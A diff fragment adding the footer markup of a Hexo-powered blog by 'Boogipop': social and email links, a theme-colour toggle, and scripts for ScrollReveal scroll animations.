+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
